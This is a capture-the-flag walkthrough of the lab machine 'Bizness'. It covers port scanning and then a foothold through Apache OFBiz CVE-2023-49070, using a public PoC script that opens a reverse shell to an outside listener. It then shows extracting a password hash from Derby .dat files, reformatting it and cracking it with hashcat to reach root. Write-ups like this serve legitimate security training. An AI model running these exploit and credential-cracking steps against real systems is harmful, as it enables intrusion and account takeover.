---------------
Bizness is an easy Linux machine showcasing an Apache OFBiz pre-authentication, remote code execution (RCE) foothold, classified as [CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070). The exploit is leveraged to obtain a shell on the box, where enumeration of the OFBiz configuration reveals a hashed password in the service's Derby database. Through research and little code review, the hash is transformed into a more common format that can be cracked by industry-standard tools. The obtained password is used to log into the box as the root user.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.11.252 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.252 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **3 open ports**:
+ **22/tcp**
+ **80/tcp**
+ **443/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.252 -p 22,80,443 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

These services are:
+ **22/tcp OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)**
+ **80/tcp nginx 1.18.0**
+ **443/tcp nginx 1.18.0**

<br />

We also find out a **hostname**, so let's add it:

```bash
echo '10.10.11.252 bizness.htb' | sudo tee --append /etc/hosts
```
<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.252 -p 22,80,443 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```
<br />

These scans didn't return any relevant information.

### Foothold

After inspecting the website and not finding anything interesting, we can start performing **directory and file enumeration**, let's look for something hidden:

```bash
feroxbuster --url https://bizness.htb -r --threads 25 -d 0 -o feroxbuster_dir_and_file_enum_443.txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k
```

<br />
<br />

There seems to be **sub-sites**, let's inspect it:<br />

![](/assets/Bizness/2.png)
<br />
<br />

There seems to be a **version number** at the **bottom left**, let's look for vulnerabilities:<br />

![](/assets/Bizness/3.png)
<br />
<br />

The search leads me to this **GitHub repository**, which seems to have an script to gain a **reverse shell**, let's download it and try it:

```bash
git clone https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC.git
cd ofbiz-CVE-2023-49070-RCE-POC
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
python3 exploit.py https://bizness.htb shell 10.10.16.5:4444
```

<br />
<br />

We got the flag! Nice, let's escalate privileges.
<br />

------
<br />
### Privilege Escalation

After a deep enumeration, we could find some **.dat files** in an **/opt/ofbiz directory**, which are files that contain the data of a database, we can try to **extract strings** from it to identify **sensitive information**:

```bash
find /opt/ofbiz -name *.dat 2>/dev/null | xargs strings | grep -v /opt
```

<br />
<br />

We could find a password hash in this files, however it's **not usable in this format**, we can use automated tools to use it, however, let's do it manually.
<br />

This hash consists of three parts separated by dollar signs, $_Algorithm_\$_salt_\$*actual_hash*, we have to transform the actual hash from base64, in this case **base64 URL Safe**, which will return a binary output, so then to **hex output**. Now that we have this hash, we have to **append the salt** at the end for hashcat to use it:

```bash
echo -n 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I' > hash
echo $(cat hash | tr '_-' '/+' | base64 -d | xxd -p):d > usable_hash
hashcat -m 120 usable_hash  /usr/share/wordlists/rockyou.txt
```

<br />
<br />

We cracked the hash!!! Let's try to use it to escalate privileges, but first let's **sanitize the shell**:

```bash
script /dev/null -c bash
reset xterm
export TERM=xterm
export SHELL=bash
su root
```
